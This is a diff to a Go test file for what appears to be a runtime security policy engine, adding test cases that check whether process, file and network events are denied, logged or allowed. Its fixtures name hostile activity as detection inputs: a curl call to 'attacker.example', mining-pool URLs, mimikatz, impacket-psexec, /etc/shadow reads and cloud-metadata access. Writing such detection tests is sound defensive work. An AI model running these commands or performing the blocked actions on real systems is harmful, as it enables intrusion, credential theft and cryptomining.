@@ -44,6 +44,19 @@ func procEvent(uid uint32, comm, filename string) *api.Event {
 	return ev
 }
 
+// procEventCtx is procEvent plus the ABI version 4 process context: the
+// parent's comm and the executed command's argv.
+func procEventCtx(uid uint32, comm, filename, parentComm string, args ...string) *api.Event {
+	ev := procEvent(uid, comm, filename)
+	ev.ParentComm = parentComm
+	ev.Process = &api.ProcessEvent{
+		BaseEvent: api.BaseEvent{Type: api.EventTypeProcess, PID: ev.PID, UID: uid, GID: uid, Comm: comm},
+		Filename:  filename,
+		Args:      args,
+	}
+	return ev
+}
+
 func fileEvent(uid uint32, comm, path, op string, flags uint32) *api.Event {
 	return &api.Event{
 		PID: 4242, UID: uid, GID: uid, Comm: comm, Type: api.EventTypeFile,
@@ -59,6 +72,15 @@ func netEvent(uid uint32, comm, addr string, port uint16) *api.Event {
 			RemoteAddr: addr, RemotePort: port, LocalPort: 40000,
 		},
 	}
+}
+
+// netEventOp is netEvent with an explicit operation, so the host's
+// direction derivation (connect/sendto = egress, recvfrom = ingress)
+// can be exercised.
+func netEventOp(uid uint32, comm, op, addr string, port uint16) *api.Event {
+	ev := netEvent(uid, comm, addr, port)
+	ev.Network.Operation = op
+	return ev
 }
 
 type crateCase struct {
@@ -93,6 +115,8 @@ var crateSuites = []crateSuite{
 			{"nsenter", procEvent(0, "nsenter", "/usr/bin/nsenter"), api.ActionDeny},
 			{"docker socket", fileEvent(0, "sh", "/var/run/docker.sock", "open", 2), api.ActionDeny},
 			{"cloud metadata", netEvent(0, "curl", "169.254.169.254", 80), api.ActionDeny},
+			// ABI v4: parent_comm rules are live
+			{"spawned by runc", procEventCtx(1000, "tool", "/bin/tool", "runc"), api.ActionLog},
 		},
 	},
 	{
@@ -104,6 +128,8 @@ var crateSuites = []crateSuite{
 			{"exec from /tmp", procEvent(1000, "x", "/tmp/payload"), api.ActionDeny},
 			{"suspicious port", netEvent(1000, "sh", "10.0.0.5", 4444), api.ActionLog},
 			{"sensitive file", fileEvent(1000, "cat", "/etc/shadow", "open", 0), api.ActionLog},
+			// ABI v4: args rules are live
+			{"suspicious argument", procEventCtx(1000, "sh", "/bin/sh", "", "curl", "http://attacker.example/x"), api.ActionLog},
 		},
 	},
 	{
@@ -114,6 +140,8 @@ var crateSuites = []crateSuite{
 			{"benign network", netEvent(1000, "curl", "93.184.216.34", 443), api.ActionAllow},
 			{"xmrig", procEvent(1000, "xmrig", "/usr/local/bin/xmrig"), api.ActionDeny},
 			{"stratum port", netEvent(1000, "worker", "51.15.1.1", 3333), api.ActionDeny},
+			// ABI v4: args rules are live
+			{"stratum argument", procEventCtx(1000, "worker", "/opt/worker", "", "--pool", "stratum+tcp://pool.example.com:3333"), api.ActionDeny},
 		},
 	},
 	{
@@ -134,6 +162,9 @@ var crateSuites = []crateSuite{
 			{"impacket-psexec", procEvent(1000, "impacket-psexec", "/usr/bin/impacket-psexec"), api.ActionDeny},
 			{"non-root reads /etc/shadow", fileEvent(1000, "cat", "/etc/shadow", "read", 0), api.ActionDeny},
 			{"mimikatz", procEvent(0, "mimikatz", "/tmp/mimikatz"), api.ActionDeny},
+			// ABI v4: parent_comm and args rules are live
+			{"spawned by wmiprvse", procEventCtx(1000, "tool", "/bin/tool", "wmiprvse"), api.ActionLog},
+			{"automated ssh flags", procEventCtx(1000, "ssh", "/opt/ssh-wrapper", "", "-o", "StrictHostKeyChecking=no"), api.ActionLog},
 		},
 	},
 	{
@@ -183,6 +214,8 @@ var crateSuites = []crateSuite{
 			{"undeclared egress port", netEvent(1000, "sh", "93.184.216.34", 6667), api.ActionDeny},
 			{"resolv.conf write", fileEvent(0, "sh", "/etc/resolv.conf", "write", 1), api.ActionDeny},
 			{"metadata service", netEvent(1000, "curl", "169.254.169.254", 80), api.ActionDeny},
+			// ABI v4: the host sends direction (recvfrom = ingress)
+			{"ingress on undeclared port", netEventOp(1000, "srv", "recvfrom", "10.0.3.7", 40000), api.ActionDeny},
 		},
 	},
 }
